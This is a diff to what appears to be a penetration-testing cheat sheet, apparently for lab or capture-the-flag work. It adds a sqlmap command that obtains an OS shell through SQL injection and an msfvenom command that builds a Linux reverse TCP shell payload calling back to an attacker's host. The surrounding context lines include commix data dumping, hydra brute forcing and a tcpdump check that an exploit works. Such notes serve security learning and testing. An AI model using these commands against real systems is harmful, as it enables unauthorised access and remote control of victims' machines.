@@ -191,6 +191,10 @@ commix \
     --risk=3 \
     --dump
   ```
+  **Get a shell**
+  ```bash
+   sqlmap $URL --data=$data --os-shell        
+  ```
 
 ## 4. Mail & User Enumeration
 ```bash
@@ -288,4 +292,9 @@ hydra -l users.txt \
 ## Check if the exploit work with tcpdump 
 ```bash
 sudo tcpdump -i tun0 -n -vv icmp
+```
+
+# Create an exploit with msfvenom
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=$IP LPORT=$port
 ```
